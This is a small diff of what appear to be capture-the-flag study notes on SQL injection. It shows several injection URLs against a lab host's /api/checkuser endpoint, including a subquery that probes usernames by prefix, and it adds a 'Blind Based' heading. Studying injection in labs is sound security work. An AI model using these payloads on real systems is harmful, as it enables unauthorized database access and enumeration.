@@ -56,4 +56,6 @@ https://dhpb2myb.eu2.ctfio.com/api/checkuser?username=adam' and 1=2;--
 6. https://dhpb2myb.eu2.ctfio.com/api/checkuser?username=adam' and 1=( select 1 from users where username like 'a%' LIMIT 1 );
 # query for the above select * from users where username='adam' and 1=( select 1 from users where username like 'a%' LIMIT 1 );'
 
+Blind Based
+
 
